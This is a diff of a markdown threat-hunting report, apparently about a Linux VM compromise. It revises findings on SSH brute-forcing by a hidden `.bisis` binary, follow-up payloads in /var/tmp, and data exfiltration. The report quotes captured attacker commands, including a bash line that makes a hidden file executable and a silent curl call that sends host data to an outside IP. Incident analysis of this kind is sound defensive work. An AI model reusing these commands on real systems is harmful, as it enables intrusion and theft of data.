@@ -154,7 +154,7 @@ and InitiatingProcessCommandLine !contains "tenable"
 
 ---
 
-### 🔎 Finding #3 — Repeated Execution of `.bisis` and Obfuscated Payloads
+### Finding #3 —Brute-Force Execution of `.bisis` with Follow-Up Payload
 
 **Command Observed:**
 ```bash
@@ -166,7 +166,7 @@ bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulim
 `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
 
 **Timeframe:**  
-`March 14, 2025 @ 12:41 UTC` → `March 18, 2025 @ 02:24 UTC`
+`March 14, 2025 @ 18:48 UTC`
 
 <!--
 **Details:**  
@@ -182,7 +182,7 @@ bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulim
 - Targets IPs listed in `iplist` and `iplist2`, brute-forcing the `root` user over port 22
 - Launches secondary binary `./x` after brute-force phase
 
-
+<!--
 > 🖼️ *Insert Screenshot 3: Process tree or timeline showing `.bisis` and `./x` execution*
 
 **Query Used:**
@@ -197,6 +197,7 @@ DeviceFileEvents
 <p align="center">
   <img src="https://github.com/user-attachments/assets/ecc9ca13-cca3-42a5-84c7-e8d9b479d76a" alt="Process execution of .bisis and x" width="800"/>
 </p>
+-->
 
 <p align="center">
   <img src="https://github.com/user-attachments/assets/0ad63c32-9742-4013-822b-fe89b1c1f27e" alt="Process execution of .bisis and x" width="300"/>
@@ -204,8 +205,8 @@ DeviceFileEvents
 </p>
 
 
-**VirusTotal Score (cache):** `31/64`  
-**Likely Role:** Brute-force tool and follow-up loader
+**Note**
+- The observed `bash` command was executed via the `Update` file, as shown in the screenshots above.
 
 **Mapped MITRE Techniques:**  
 - `T1027` — Obfuscated Files or Information  
@@ -213,7 +214,7 @@ DeviceFileEvents
 
 ---
 
-### 🔎 Finding #4 — Malicious File Executions in `/var/tmp`
+### Finding #4 — Malicious File Executions in `/var/tmp`
 
 **Indicator:**  
 Files: `.b`, `.bisis`, `.cache`, `.history`, `Update`, and `x`
@@ -246,11 +247,9 @@ DeviceProcessEvents
 - `T1059.004` — Command and Scripting Interpreter: Unix Shell  
 - `T1036` — Masquerading
 
-**Status:** ✅ *Confirmed Malicious*
-
 ---
 
-### 🔎 Finding #5 — Exfiltration via Silent `curl` Request
+### Finding #5 — Exfiltration via Silent `curl` Request
 
 **Indicator:**  
 `curl` to `http://196.251.73.38:47/save-data`
@@ -292,11 +291,9 @@ curl --silent "http://196.251.73.38:47/save-data?IP=45.64.186.20" \
 - `T1041` — Exfiltration Over C2 Channel  
 - `T1071.001` — Application Layer Protocol: Web Protocols
 
-**Status:** ✅ *Confirmed Malicious*
-
 ---
 
-### 🔎 Finding #6 — Execution of `Update` and `.history` Files
+### Finding #6 — Execution of `Update` and `.history` Files
 
 **Indicator:**  
 `.update-logs/Update`, `.history`
@@ -327,8 +324,6 @@ DeviceProcessEvents
 **Mapped MITRE Techniques:**  
 - `T1059` — Command and Scripting Interpreter  
 - `T1105` — Ingress Tool Transfer
-
-**Status:** ✅ *Confirmed Malicious*
 
 ---
 
